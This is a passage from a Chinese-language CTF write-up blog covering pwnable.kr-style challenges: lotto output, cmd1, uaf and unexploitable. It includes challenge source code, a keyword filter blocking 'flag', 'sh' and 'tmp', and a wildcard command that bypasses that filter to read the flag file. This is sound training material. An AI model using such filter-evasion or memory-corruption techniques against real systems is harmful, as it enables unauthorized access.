</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span></code></pre></div><h2 id=14-cmd1>14 cmd1<a hidden class=anchor aria-hidden=true href=#14-cmd1>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>  
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>filter</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>cmd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>r</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=s>&#34;flag&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=s>&#34;sh&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=s>&#34;tmp&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>**</span> <span class=n>envp</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>putenv</span><span class=p>(</span><span class=s>&#34;PATH=/thankyouverymuch&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nf>filter</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>system</span><span class=p>(</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>代码很短, 主要就是执行<code>system(argv[1])</code>但可以看到该程序把PATH指向了一个显然不能用的路径, 而且我们传入的argv里不能包含flag, sh, tmp, 也就是不能直接或间接地把flag打印出来.</p><ol><li>没有环境变量, 就直接用绝对路径<code>"/bin/cat"</code></li><li>不能直接出现flag, 但可以用<code>*</code>通配符啊
所以</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>./cmd &#34;/bin/cat fl*&#34;
</span></span></code></pre></div><h2 id=15-cmd2>15 cmd2<a hidden class=anchor aria-hidden=true href=#15-cmd2>#</a></h2><p>没做呢</p><h2 id=16-uaf>16 uaf<a hidden class=anchor aria-hidden=true href=#16-uaf>#</a></h2><p>use after free漏洞
源码:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstdlib&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstring&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;iostream&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>using</span> <span class=k>namespace</span> <span class=n>std</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Human</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>private</span><span class=o>:</span>
</span></span><span class=line><span class=cl>  <span class=k>virtual</span> <span class=kt>void</span> <span class=n>give_shell</span><span class=p>()</span> <span class=p>{</span> <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>protected</span><span class=o>:</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>age</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>string</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>  <span class=k>virtual</span> <span class=kt>void</span> <span class=n>introduce</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;My name is &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>name</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;I am &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>age</span> <span class=o>&lt;&lt;</span> <span class=s>&#34; years old&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Man</span> <span class=o>:</span> <span class=k>public</span> <span class=n>Human</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>  <span class=n>Man</span><span class=p>(</span><span class=n>string</span> <span class=n>name</span><span class=p>,</span> <span class=kt>int</span> <span class=n>age</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>this</span><span class=o>-&gt;</span><span class=n>age</span> <span class=o>=</span> <span class=n>age</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>virtual</span> <span class=kt>void</span> <span class=nf>introduce</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Human</span><span class=o>::</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;I am a nice guy!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Woman</span> <span class=o>:</span> <span class=k>public</span> <span class=n>Human</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>  <span class=n>Woman</span><span class=p>(</span><span class=n>string</span> <span class=n>name</span><span class=p>,</span> <span class=kt>int</span> <span class=n>age</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>this</span><span class=o>-&gt;</span><span class=n>age</span> <span class=o>=</span> <span class=n>age</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>virtual</span> <span class=kt>void</span> <span class=nf>introduce</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Human</span><span class=o>::</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;I am a cute girl!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Human</span> <span class=o>*</span><span class=n>m</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Man</span><span class=p>(</span><span class=s>&#34;Jack&#34;</span><span class=p>,</span> <span class=mi>25</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>Human</span> <span class=o>*</span><span class=n>w</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Woman</span><span class=p>(</span><span class=s>&#34;Jill&#34;</span><span class=p>,</span> <span class=mi>21</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>size_t</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>op</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;1. use</span><span class=se>\n</span><span class=s>2. after</span><span class=se>\n</span><span class=s>3. free</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>op</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=n>op</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
</span></span><span class=line><span class=cl>      <span class=n>m</span><span class=o>-&gt;</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=n>w</span><span class=o>-&gt;</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
</span></span><span class=line><span class=cl>      <span class=n>len</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>      <span class=n>data</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>char</span><span class=p>[</span><span class=n>len</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>read</span><span class=p>(</span><span class=n>open</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>O_RDONLY</span><span class=p>),</span> <span class=n>data</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;your data is allocated&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=mi>3</span><span class=o>:</span>
</span></span><span class=line><span class=cl>      <span class=k>delete</span> <span class=n>m</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>delete</span> <span class=n>w</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=unexploitable>unexploitable<a hidden class=anchor aria-hidden=true href=#unexploitable>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-10h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>sleep</span><span class=p>(</span><span class=mi>3u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x50FuLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>GOT表里什么都没有, 乍一看好像寄了, 但神奇的地方在于这个read的参数0x50F, 他在内存里是个0x0F05,所以用ROPgadget能找到一个syscall.</p><p><a href=https://zhuanlan.zhihu.com/p/353260837>0.虚表</a>
<a href=https://blog.csdn.net/weixin_43921239/article/details/100828167>1</a>
<a href=https://www.cnblogs.com/L0g4n-blog/p/12887869.html>2</a>
<a href=https://blog.csdn.net/Breeze_CAT/article/details/103788698>3</a></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://juicymio.github.io/tags/pwn/>Pwn</a></li></ul><nav class=paginav><a class=prev href=https://juicymio.github.io/posts/c/><span class=title>« Prev</span><br><span>C/C++杂项知识点</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://juicymio.github.io/>JuicyMio's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>